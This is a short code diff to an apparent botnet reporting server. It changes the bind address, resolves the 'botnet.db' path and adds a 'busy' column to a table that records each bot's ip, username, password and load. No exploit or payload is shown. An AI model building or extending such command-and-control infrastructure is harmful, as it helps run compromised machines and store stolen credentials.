@@ -9,14 +9,16 @@ import hashlib
 import socket
 import sqlite3
 import threading
+import inspect
 import datetime
 import signal
 import sys
 import os
 
-HOST = "0.0.0.0"
+HOST = "172.18.0.1" # docker bridge
 PORT = int(os.getenv("REPORT_PORT", 5000))
-DB   = os.getenv("DB_PATH", "botnet.db")
+default_db_path = os.path.join(os.path.dirname(inspect.stack()[0][1]), "../db/botnet.db")
+DB   = os.getenv("DB_PATH", default_db_path)
 
 
 # ─────────────────────────────────────────
@@ -37,6 +39,7 @@ def db_init():
             ip          TEXT,
             username    TEXT,
             password    TEXT,
+            busy        INTEGER,
             arch        TEXT,
             cpu_load    REAL,
             memory      REAL,
